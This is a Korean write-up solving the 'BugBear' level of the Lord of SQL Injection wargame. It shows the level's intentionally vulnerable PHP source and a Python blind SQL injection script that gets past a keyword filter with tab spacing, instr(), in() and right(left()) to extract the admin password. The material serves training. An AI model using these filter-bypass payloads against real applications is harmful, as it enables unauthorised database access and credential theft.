---
layout: default
title: BugBear
parent: Load Of SQL Injection
nav_order: 13
---

# BugBear

띄어쓰기, 아스키코드, hex, substr등을 우회하면 된다.

=과 like도 필터링 되었는데, in()을 사용해 우회할 수 있다.

```php
<?php 
  include "./config.php"; 
  login_chk(); 
  dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[no])) exit("No Hack ~_~"); 
  if(preg_match('/\'/i', $_GET[pw])) exit("HeHe"); 
  if(preg_match('/\'|substr|ascii|=|or|and| |like|0x/i', $_GET[no])) exit("HeHe"); 
  $query = "select id from prob_bugbear where id='guest' and pw='{$_GET[pw]}' and no={$_GET[no]}"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysql_fetch_array(mysql_query($query)); 
  if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
   
  $_GET[pw] = addslashes($_GET[pw]); 
  $query = "select pw from prob_bugbear where id='admin' and pw='{$_GET[pw]}'"; 
  $result = @mysql_fetch_array(mysql_query($query)); 
  if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("bugbear"); 
  highlight_file(__FILE__); 
?>
```

python으로 툴을 짜 pw를 가져올 수 있다.

```python
import urllib, urllib2, cookielib, re, ssl
key=''
length=0
cj = cookielib.CookieJar()
opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))
opener.addheaders={('User-agent','Mozila/5.0(compatible;MSIE 5.5;Windows NT)')}

loginUrl2='https://los.eagle-jump.org/?login'
login_form={"id":"los_id","pw":"los_pw"}
login_form=urllib.urlencode(login_form)
reqLogin = opener.open('https://los.eagle-jump.org/?login',login_form)
url = 'https://los.eagle-jump.org/gate.php'
req=opener.open(url)

print 'start Blind SQL Injection'
print "search key's length"
while 1:
    length=length+1
    url = 'https://los.eagle-jump.org/bugbear_431917ddc1dec75b4d65a23bd39689f8.php?no=1%%09||%%09instr(id,"admin")%%09%%26%%26%%09length(pw)in(%d)'%(length)
    print url
    resp=opener.open(url)
    rresp=resp.read()
    find=re.findall("Hello admin",rresp)
    if find:
        break
print length

print 'search key.'
lenck=1
while 1:
    subkey = 31
    for x in range(96):
        subkey=subkey+1
        chrkey=chr(subkey);
	if chrkey=="%":
		subkey=subkey+1
		chrkey=chr(subkey)
        url='https://los.eagle-jump.org/bugbear_431917ddc1dec75b4d65a23bd39689f8.php?no=1%%09||%%09instr(id,"admin")%%09%%26%%26%%09right(left(pw,%d),1)in("%s")' %(lenck,chrkey)
        print url
        resp=opener.open(url)
        rresp=resp.read()
        find=re.findall("Hello admin",rresp)
        if find:
            print 'find'
            key=key+chrkey
            break
    lenck=lenck+1
    if lenck-1==length:
        break

print 'find key.'
print key.lower()
```